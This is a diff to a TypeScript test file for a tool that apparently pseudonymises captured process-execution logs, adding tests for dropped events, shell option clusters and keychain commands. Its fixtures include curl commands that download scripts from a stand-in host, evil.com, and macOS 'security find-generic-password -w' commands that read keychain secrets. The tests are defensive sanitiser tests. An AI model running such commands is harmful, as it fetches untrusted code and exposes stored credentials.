@@ -50,7 +50,7 @@ export interface CleanRun {
  * Without `-o` the capture goes to `out.jsonl` in that folder. `input` is written to a file and passed as `-i`, or
  * with `-i -` given on standard input.
  */
-export function runClean(args: string[], opts: { input?: string; env?: Record<string, string> } = {}): CleanRun {
+export function runClean(args: string[], opts: { input?: string; env?: Record<string, string>; uncleaned?: number } = {}): CleanRun {
   const dir = tmpDir();
   const argv = [...args];
   const fromStdin = argv[argv.indexOf('-i') + 1] === '-' && argv.includes('-i');
@@ -75,6 +75,8 @@ export function runClean(args: string[], opts: { input?: string; env?: Record<st
   const out = outFile === null ? r.stdout.toString('utf8') : fs.existsSync(outFile) ? fs.readFileSync(outFile, 'utf8') : '';
   const keyFile = summary['key'];
   const key = keyFile && fs.existsSync(keyFile) ? fs.readFileSync(keyFile, 'utf8') : '';
+  // An event the cleaner could not clean is dropped: a bug in the program would thin the capture without a word.
+  if (argv[0] === 'clean' && r.status === 0) expect(summary['events the cleaner could not clean'], stderr).toBe(String(opts.uncleaned ?? 0));
   return { out, key, summary, stderr, status: r.status ?? -1 };
 }
 
@@ -141,6 +143,17 @@ describe.skipIf(!fs.existsSync(JQ))('plumbing', () => {
     expect(lines(r.out)).toHaveLength(2);
     expect(r.summary['unreadable lines dropped']).toBe('4');
     expect(r.out).not.toContain('SECRETFRAG');
+  });
+
+  test('an event the cleaner cannot clean is dropped and counted apart from unreadable lines, never copied', () => {
+    const good = synthLines();
+    const r = runClean(['clean', '-o', '-'], { input: [good[0], '{"event":"SECRETFRAG3"}', 'not json', good[1]].join('\n') + '\n', uncleaned: 1 });
+    expect(r.status, r.stderr).toBe(0);
+    expect(lines(r.out)).toHaveLength(2);
+    expect(r.summary['events in']).toBe('4');
+    expect(r.summary['unreadable lines dropped']).toBe('1');
+    expect(r.summary['events the cleaner could not clean']).toBe('1');
+    for (const t of [r.out, r.stderr, r.key]) expect(t).not.toContain('SECRETFRAG3');
   });
 
   test('a pretty-printed export and a JSON array are read', () => {
@@ -400,7 +413,7 @@ describe.skipIf(!fs.existsSync(JQ))('the stream between jq and the files', () =>
     // Each real value is one JSON string on one line, so tabs, newlines and quotes survive.
     expect(fs.readFileSync(key, 'utf8').split('\n')[1]).toBe(`user\tuser5\t${JSON.stringify(nasty)}`);
     expect(JSON.parse(fs.readFileSync(stats, 'utf8'))).toEqual({
-      eventsIn: 6, eventsOut: 5, unreadable: 1, seqGaps: 2, redacted: 0, placeholders: { user: 3 },
+      eventsIn: 6, eventsOut: 5, unreadable: 1, uncleaned: 0, seqGaps: 2, redacted: 0, placeholders: { user: 3 },
     });
     expect(r.stderr.toString()).not.toMatch(/^[KS]\t/m);
   });
@@ -1406,7 +1419,7 @@ describe.skipIf(!fs.existsSync(JQ))('arguments and text', () => {
     const input = [
       run(710, '/bin/zsh', ['-zsh', '-c', 'curl -o/Users/jdoe/Downloads/a.sh https://evil.com/a.sh'], '/', 1),
       run(711, '/usr/bin/su', ['-su', '-c', 'curl -o/Users/jdoe/Downloads/b.sh https://evil.com/b.sh'], '/', 2),
-      run(712, '/usr/bin/sudo', ['sudo', '-bash', '-lc', 'curl -o/Users/jdoe/Downloads/c.sh https://evil.com/c.sh'], '/', 3),
+      run(712, '/bin/bash', ['-bash', '-lc', 'curl -o/Users/jdoe/Downloads/c.sh https://evil.com/c.sh'], '/', 3),
     ].join('\n') + '\n';
     const r = runClean(['clean', '-o', '-'], { input });
     expect(r.status, r.stderr).toBe(0);
@@ -1415,9 +1428,51 @@ describe.skipIf(!fs.existsSync(JQ))('arguments and text', () => {
     expect(args).toEqual([
       ['-zsh', '-c', `curl -o/Users/user1/Downloads/${n.get('a.sh')} https://evil.com/a.sh`],
       ['-su', '-c', `curl -o/Users/user1/Downloads/${n.get('b.sh')} https://evil.com/b.sh`],
-      ['sudo', '-bash', '-lc', `curl -o/Users/user1/Downloads/${n.get('c.sh')} https://evil.com/c.sh`],
+      ['-bash', '-lc', `curl -o/Users/user1/Downloads/${n.get('c.sh')} https://evil.com/c.sh`],
     ]);
     for (const real of ['a.sh', 'b.sh', 'c.sh']) expect(n.has(real), real).toBe(true);
+    sameFindings(input, r.out);
+  });
+
+  // The dash of a login shell is argv[0]'s: anywhere else, -sh or -su is a cluster of options (du -sh, grep -sh).
+  test('an option cluster that ends in sh or su is not a shell, so the -c after it takes a plain value', () => {
+    const docs = '/Users/jdoe/Documents';
+    const input = [
+      run(720, '/usr/bin/du', ['du', '-sh', '-c', 'Board Docs'], docs, 1),
+      run(721, '/usr/bin/grep', ['grep', '-sh', '-c', 'John Smith', 'notes.txt'], docs, 2),
+      run(722, '/usr/bin/du', ['du', '-sh', '-c', '/Users/jdoe/Documents/Board Docs'], '/', 3),
+      run(723, '/bin/ls', ['ls', '-su', '-c', 'Jane Roe'], docs, 4),
+    ].join('\n') + '\n';
+    const r = runClean(['clean', '-o', '-'], { input });
+    expect(r.status, r.stderr).toBe(0);
+    const n = keyed(r.key, 'name');
+    const args = events(r.out).map(e => e.event.exec.args as string[]);
+    expect(args).toEqual([
+      ['du', '-sh', '-c', n.get('Board Docs')],
+      ['grep', '-sh', '-c', n.get('John Smith'), n.get('notes.txt')],
+      ['du', '-sh', '-c', `/Users/user1/Documents/${n.get('Board Docs')}`],
+      ['ls', '-su', '-c', n.get('Jane Roe')],
+    ]);
+    expect(r.out).not.toMatch(/Board|Docs|John|Smith|Jane|Roe|jdoe/);
+    sameFindings(input, r.out);
+  });
+
+  // The keychain rule reads its phrases from security's arguments; in any other command a quoted name is a name.
+  test('a quoted name with a wallet word in shell code is a name, unless the code runs security', () => {
+    const docs = '/Users/jdoe/Documents';
+    const input = [
+      run(730, '/bin/sh', ['sh', '-c', 'cp "John Smith Exodus Backup.pdf" /tmp/x'], docs, 1),
+      run(731, '/bin/sh', ['sh', '-c', 'security find-generic-password -l "jdoe Exodus backup" -w'], docs, 2),
+      run(732, '/bin/sh', ['sh', '-c', '/usr/bin/security find-generic-password -s "jdoe Safe Storage" -w'], docs, 3),
+    ].join('\n') + '\n';
+    const r = runClean(['clean', '-o', '-'], { input });
+    expect(r.status, r.stderr).toBe(0);
+    const n = keyed(r.key, 'name');
+    const args = events(r.out).map(e => e.event.exec.args as string[]);
+    expect(args[0]![2]).toBe(`cp "${n.get('John Smith Exodus Backup.pdf')}" /tmp/${n.get('x')}`);
+    expect(args[1]![2]).toBe('security find-generic-password -l "user1 Exodus backup" -w');
+    expect(args[2]![2]).toBe('/usr/bin/security find-generic-password -s "user1 Safe Storage" -w');
+    expect(r.out).not.toMatch(/John|Smith|jdoe/);
     sameFindings(input, r.out);
   });
 
